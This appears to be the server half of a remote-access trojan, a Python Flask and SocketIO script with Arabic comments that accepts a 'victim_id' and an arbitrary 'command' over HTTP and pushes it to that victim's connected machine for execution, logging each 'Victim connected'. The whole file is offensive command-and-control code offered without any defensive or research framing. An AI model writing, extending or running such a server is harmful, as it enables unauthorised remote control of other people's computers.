from flask import Flask, request, jsonify
from flask_socketio import SocketIO
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# تخزين الأوامر
commands = {}

@app.route('/send_command', methods=['POST'])
def handle_command():
    try:
        data = request.get_json()
        
        if not data or 'victim_id' not in data or 'command' not in data:
            return jsonify({
                'status': 'error',
                'message': 'victim_id and command are required'
            }), 400
        
        command_id = str(uuid.uuid4())
        commands[command_id] = {
            'victim_id': data['victim_id'],
            'command': data['command'],
            'status': 'pending'
        }
        
        # إرسال عبر WebSocket
        socketio.emit('execute_command', {
            'command_id': command_id,
            'command': data['command']
        }, room=data['victim_id'])
        
        return jsonify({
            'status': 'success',
            'command_id': command_id,
            'method': 'websocket'
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@socketio.on('connect')
def handle_ws_connect():
    victim_id = request.args.get('victim_id')
    if victim_id:
        print(f'Victim connected: {victim_id}')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
